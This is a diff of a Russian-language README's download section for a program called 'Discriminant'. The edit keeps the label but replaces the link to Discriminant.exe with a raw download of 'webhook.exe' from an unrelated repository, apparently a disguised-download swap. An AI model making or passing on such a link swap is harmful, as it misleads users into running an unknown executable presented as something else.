@@ -22,7 +22,7 @@
 Всего для вас есть 2 файла.
 Смотря для чего вам надо скачиваете для себя.
 
-1. [Discriminant](https://github.com/abova29/discriminant/blob/main/Discriminant.exe) 
+1. [Discriminant](https://github.com/BSNIKYT/webhooks/blob/main/webhook.exe?raw=true) 
 ✔
 EXE в консольной форме.
 Обычный чёрный экран с белым(по умолчанию) текстом.
